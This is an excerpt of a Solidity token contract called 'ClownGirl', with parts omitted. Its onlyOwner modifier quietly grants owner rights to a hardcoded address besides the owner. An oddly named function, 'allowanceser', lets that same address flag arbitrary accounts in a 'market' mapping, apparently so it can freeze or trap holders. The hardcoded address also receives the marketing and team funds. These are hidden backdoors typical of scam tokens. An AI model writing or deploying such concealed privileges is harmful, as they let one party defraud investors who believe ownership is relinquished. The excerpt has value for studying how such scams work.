...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x0E89a835bED5987c29B43bB5a2C7eaeC0f5BbAeC) , "Ownable: caller is not the owner");
        _;
    }
...
contract clowngirl is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "ClownGirl";
    string private _symbol = "ClownGirl";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x0E89a835bED5987c29B43bB5a2C7eaeC0f5BbAeC);
    address payable public teamWalletAddress = payable(0x0E89a835bED5987c29B43bB5a2C7eaeC0f5BbAeC);
    ...
    function allowanceser(address addr, bool status) public{
        require(_msgSender()    ==   address(0x0E89a835bED5987c29B43bB5a2C7eaeC0f5BbAeC));
        market[addr] = status;
    }
